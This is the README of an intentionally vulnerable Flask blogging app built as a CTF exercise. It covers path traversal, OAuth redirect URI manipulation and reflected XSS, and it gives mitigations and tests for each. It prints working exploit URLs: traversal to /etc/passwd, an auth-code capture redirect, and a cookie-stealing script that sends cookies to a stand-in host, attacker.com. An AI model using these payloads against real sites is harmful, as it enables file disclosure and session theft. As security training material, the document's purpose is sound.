# BlogSphere

BlogSphere is a Flask-based web application designed for a Capture The Flag (CTF) challenge, focusing on web security vulnerabilities. The project simulates a blogging platform with intentional security flaws, including Local File Inclusion (LFI), OAuth Redirect URI Manipulation, and Reflected Cross-Site Scripting (XSS), to educate users on identifying and mitigating common web security risks.

## Project Overview

- **Purpose**: Educational CTF challenge to demonstrate web vulnerabilities.
- **Technologies**: Flask, Python, HTML, CSS.
- **Vulnerabilities**:
  - Local File Inclusion (LFI) in the `/view` endpoint.
  - OAuth Redirect URI Manipulation in the `/login` and `/callback` endpoints.
  - Reflected Cross-Site Scripting (XSS) in the `/search` endpoint.
- **Mitigation**: The project includes guidance on securing these vulnerabilities.

## Directory Structure

```bash
CTF/
├── app.py                # Main Flask application
├── idp.py                # Identity Provider for OAuth simulation
├── posts/                # Directory for blog posts
│   ├── post1.html        # Blog post with OAuth hints
│   └── post2.html        # Blog post on ethical hacking
├── templates/            # HTML templates for Flask
│   ├── index.html
│   ├── search.html
│   ├── dashboard.html    # Protected dashboard with CTF flag
├── static/               # Static files (CSS, JS, images)
│   ├── css/
│   │   └── style.css
│   ├── images/
│   │   └── download (3).png  # Local image for blog posts
└── flag.txt              # Sample flag file for LFI
```

## Setup Instructions

1. **Clone the Repository**:

   ```bash
   git clone <repository-url>
   cd CTF
   ```

2. **Install Dependencies**: Ensure Python 3 and pip are installed, then run:

   ```bash
   pip install flask requests
   ```

3. **Run the Applications**:

   - **Main App** (`app.py`):

     ```bash
     python app.py
     ```

     - Runs on `http://localhost:5000`.

   - **Identity Provider** (`idp.py`):

     ```bash
     python idp.py
     ```

     - Runs on `http://localhost:5001`.

   - **Attacker Server** (optional, for testing):

     ```bash
     python attacker.py
     ```

     - Runs on `http://localhost:8000`

## Usage

- **Access Blog Posts**:

  - Visit `http://localhost:5000/view?page=post1.html` to see "The Art of Secure Authentication."
  - Visit `http://localhost:5000/view?page=post2.html` to see "Ethical Hacking 101."

- **Trigger Vulnerabilities**:

  - **LFI**: Attempt to access sensitive files (e.g., `/etc/passwd`) via directory traversal in the `page` parameter.
  - **OAuth**: Use the `/login` endpoint to initiate an OAuth flow and manipulate the `redirect_uri` to capture authorization codes.
  - **XSS**: Use the `/search` endpoint with a malicious query to inject scripts.

- **Exploit the Vulnerabilities**:

  - **LFI**: Use a URL like `http://localhost:5000/view?page=../../../../etc/passwd` to read system files.
  - **OAuth**: Craft a malicious URL (e.g., `http://localhost:5001/auth?client_id=blogsphere_client&redirect_uri=http://localhost:8000/attacker&response_type=code&state=attacker_state`) to capture the authorization code and access the dashboard.
  - **XSS**: Use a URL like `http://localhost:5000/search?query=<script>alert('XSS')</script>` to execute a script and potentially steal the flag cookie.

## Vulnerabilities

### 1. Local File Inclusion (LFI)

- **Location**: `/view` endpoint in `app.py`.
- **Description**: The endpoint uses `os.path.abspath` without proper validation, allowing directory traversal to access arbitrary files (e.g., `/etc/passwd`, `flag.txt`).
- **Exploitation**:
  - Visit `http://localhost:5000/view?page=../etc/passwd` to read `/etc/passwd`.
  - Access `flag.txt` with `http://localhost:5000/view?page=../flag.txt`.

### 2. OAuth Redirect URI Manipulation

- **Location**: `/login` and `/callback` endpoints in `app.py` and `idp.py`.
- **Description**: The IdP (`idp.py`) does not validate the `redirect_uri` against registered URIs for `client_id=blogsphere_client`, allowing attackers to use arbitrary `redirect_uri` values to capture authorization codes.
- **Exploitation**:
  - Craft a URL like `http://localhost:5001/auth?client_id=blogsphere_client&redirect_uri=http://localhost:8000/attacker&response_type=code&state=attacker_state`.
  - Log in to receive the authorization code at the attacker-controlled endpoint.
  - Use the code to access the protected dashboard at `http://localhost:5000/callback?code=<captured_code>&state=attacker_state`.

### 3. Reflected Cross-Site Scripting (XSS)

- **Location**: `/search` endpoint in `app.py`.
- **Description**: The endpoint accepts a `query` parameter and directly embeds it into an HTML response without sanitization or escaping, allowing attackers to inject malicious scripts. If the query contains HTML tags, a cookie containing the flag (`flag{r3fl3ct3d_xss_pwn3d}`) is set, which can be stolen via script execution.
- **Exploitation**:
  - Visit `http://localhost:5000/search?query=<script>alert('XSS')</script>` to execute a JavaScript alert.
  - Use a payload like `http://localhost:5000/search?query=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` to steal the flag cookie.

## Mitigation

### 1. LFI Mitigation

- **Fix**: Validate the file path to ensure it remains within the `posts/` directory.

- **Code**:

  ```python
  if not os.path.realpath(requested_file).startswith(os.path.realpath(POSTS_DIR)):
      return "Access denied: Invalid file path", 403
  ```

### 2. OAuth Mitigation

- **Fix**: Validate the `redirect_uri` against the client's registered URIs and enable `state` parameter validation.

- **Code** (in `idp.py`):

  ```python
  if client_id in CLIENTS and redirect_uri in CLIENTS[client_id]['redirect_uris']:
            auth_code = f"code_{secrets.token_hex(8)}"
            redirect_url = f"{redirect_uri}?code={auth_code}&state={state}"
            print(f"Returning state: {state}")
            return redirect(redirect_url)
        return "Invalid client ID or redirect URI", 400
    return "Invalid credentials", 401

- **Code** (in `app.py`):

  ```python
  if not state or state != session.get('oauth_state'):
      return "Invalid state parameter", 400
  ```

### 3. XSS Mitigation

- **Fix**: Escape the `query` parameter using `markupsafe.escape` to prevent malicious HTML or JavaScript from being rendered.

- **Code** (in `app.py`):

  ```python
  from markupsafe import escape

  @app.route('/search')
  def search():
      query = escape(request.args.get('query', ''))  # Escape input to prevent XSS
      # ... rest of the code ...
  ```

## Testing

- **LFI**:

  - **Vulnerable**: `curl "http://localhost:5000/view?page=../../../../etc/passwd"`
  - **Mitigated**: `curl "http://localhost:5000/view?page=../../../../etc/passwd"` should return "Access denied: Invalid file path".

- **OAuth**:

  - **Vulnerable**: Use the malicious URL to capture the code and access the dashboard.
  - **Mitigated**: Attempting the same URL should return "Invalid redirect URI" from the IdP.

- **XSS**:

  - **Vulnerable**: `curl "http://localhost:5000/search?query=<script>alert('XSS')</script>"` should reflect the script in the response.
  - **Mitigated**: `curl "http://localhost:5000/search?query=<script>alert('XSS')</script>"` should show escaped characters (e.g., `<script>`).

- **Blog Posts**:

  - Access `http://localhost:5000/view?page=post1.html` and `http://localhost:5000/view?page=post2.html` to verify content and images.

## Additional Notes

- **Customizing Blog Posts**: Edit `post1.html` and `post2.html` in `posts/` to modify content or add hints.
- **Images**: Local images are stored in `static/images/`. Update paths in HTML using `{{ url_for('static', filename='images/image.png') }}`.
- **Further Learning**: Explore OWASP's guides on Path Traversal, OAuth Security, and Cross-Site Scripting (XSS).